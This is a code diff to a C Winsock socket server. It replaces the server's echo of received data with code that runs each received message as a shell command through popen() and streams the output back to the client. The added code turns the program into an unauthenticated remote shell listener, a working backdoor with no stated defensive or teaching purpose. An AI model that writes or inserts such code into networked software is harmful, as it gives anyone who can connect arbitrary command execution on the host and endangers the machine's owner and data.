@@ -1,8 +1,6 @@
 #include <stdio.h>
 #include <winsock2.h>
-
-// socket programming, server
-// build with gcc server.c -o server.exe -lws2_32
+#include <stdlib.h>
 
 void main(int argc, char *argv[]) {
 
@@ -64,10 +62,28 @@ void main(int argc, char *argv[]) {
                 {
                     buffer[valread] = '\0';
                     printf("%s:%d - %s\n" , inet_ntoa(address.sin_addr) , ntohs(address.sin_port), buffer);
-                    send(outbound, buffer , valread , 0 );
+               //     send(outbound, "asdasdddddddddddddddddddddd", valread, 0);
+                    
+                //    if (strcmp(buffer, "test") == 0) {
+                //        
+                //    }
+                    FILE *fp;
+                    char command[1024];
+
+                    fp = popen(buffer, "r");
+                    
+                    printf("%s:%d - %s\n" , inet_ntoa(address.sin_addr) , ntohs(address.sin_port), buffer);
+
+                    while (fgets(command, sizeof(command), fp) != NULL) {
+                       //   printf("%s", command);
+                          send(outbound, command, strlen(command) + 1, 0);
+                    }
+                    pclose(fp);
+                    
                 }
             }    
     }
     closesocket(outbound);
     WSACleanup();
 }
+
